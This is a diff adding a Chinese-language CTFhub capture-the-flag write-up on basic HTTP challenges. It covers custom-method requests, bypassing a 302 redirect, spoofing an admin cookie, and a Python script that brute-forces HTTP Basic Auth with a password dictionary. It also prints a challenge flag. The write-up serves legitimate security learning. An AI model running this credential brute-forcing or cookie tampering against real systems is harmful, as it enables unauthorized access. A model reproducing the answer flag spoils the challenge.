@@ -97,3 +97,99 @@ print(response.text)
 ---
 ###  总结
 这三个靶场揭示了 Web 安全的基石：**永远不要相信客户端发来的任何数据**。无论是 Method、行为路径，还是 Cookie，只要它在 HTTP 报文里，它就是可以被黑客任意揉捏的面团。
+
+
+
+
+
+# 🛡️ CTFhub Web 实战日志：HTTP 协议基础攻防全集
+
+> **Author:** Zuo Qixuan
+> **Date:** 2026-04-10
+> **Focus:** Web Security, Protocol Analysis, Brute Force Logic
+> **Core Concept:** 渗透测试不只是运行脚本，而是对底层协议定义的极致理解。
+
+---
+
+## 🎯 0x01 请求方式 (HTTP Method Forge)
+
+### 📌 原理简述
+HTTP 报文的本质是特定格式的字符串。如果服务器端未对请求方法（Method）做白名单限制，攻击者可以通过构造非标准方法（如 `CTFHUB`）来触发特定的后端逻辑。
+
+### 🚩 漏洞利用
+```bash
+# 使用 cURL 强行指定自定义方法
+curl -X CTFHUB http://<Target_IP>:<Port>/index.php
+```
+
+---
+
+## 🎯 0x02 302 跳转 (HTTP 302 Redirect Bypass)
+
+### 📌 原理简述
+`302 Found` 代表临时重定向。浏览器会自动跟随 `Location` 头跳转，从而忽略掉原始 302 响应体（Body）中的内容。
+**核心思路：** 使用工具禁止自动重定向，截获第一层响应。
+
+### 🚩 漏洞利用 (Python)
+```python
+import requests
+# allow_redirects=False 是夺旗关键
+response = requests.get(url, allow_redirects=False)
+print(response.text)
+```
+
+---
+
+## 🎯 0x03 Cookie 欺骗 (Cookie Spoofing)
+
+### 📌 原理简述
+HTTP 是无状态的，依靠 Cookie 维持身份。若服务器仅通过客户端可控的 Cookie 字段（如 `admin=0/1`）判断权限，则存在越权漏洞。
+
+### 🚩 漏洞利用
+1. **F12 开发者工具**：在 `Application -> Cookies` 中直接双击修改 `admin` 值为 `1`。
+2. **刷新页面**：携带篡改后的身份凭证通过校验。
+
+---
+
+## 🎯 0x04 基础认证 (HTTP Basic Auth)
+
+### 📌 原理简述
+Basic Auth 要求在 Header 中携带 `Authorization: Basic <Base64(user:pass)>`。本题考查对**受保护路径**的自动化爆破能力。
+
+### ⚠️ 逻辑陷阱：假阳性 (False Positive)
+在编写爆破脚本时，**必须将请求目标对准受保护的资源路径（如 `/flag.html`）**，而不是不设防的主页（`/`）。
+* **错误操作：** 对着主页跑字典。由于主页不设防，任何密码都会返回 `200 OK`，导致脚本误判爆破成功。
+* **正确操作：** 对着返回 `401` 的页面跑字典，只有返回 `200` 时才是真密码。
+
+### 🚩 自动化爆破脚本 (Python)
+```python
+import requests
+
+# 1. 精确瞄准受保护的资源
+url = "[http://challenge-xxx.ctfhub.com:10800/flag.html](http://challenge-xxx.ctfhub.com:10800/flag.html)"
+username = "admin"
+dictionary = r"C:\path\to\your\top100_password.txt"
+
+with open(dictionary, "r") as f:
+    for line in f:
+        password = line.strip()
+        # 利用 requests 内置的 auth 自动处理 Base64
+        resp = requests.get(url, auth=(username, password))
+        
+        if resp.status_code == 200:
+            print(f"🎯 命中真密码: {password}")
+            print(f"🚩 Flag: {resp.text}")
+            break
+```
+
+---
+
+## 💡 战后复盘 (Retrospective)
+
+1. **协议认知：** 基础认证是基于**资源路径**的质询。搞清楚“哪扇门上了锁”比“怎么捅锁”更重要。
+2. **环境意识：** 动态靶场有生命周期（1小时），且每次重启可能随机化密码。
+3. **工具边界：** 浏览器存在缓存、强制 HTTPS、代理重定向等干扰因子。在关键取旗阶段，**Python 脚本/cURL** 的原始报文交互比浏览器更诚实可靠。
+
+---
+**Status:** 🟩 All HTTP Basics Captured.
+**Flag:** `ctfhub{bab7f2f722a9b86e4546b3f0}`
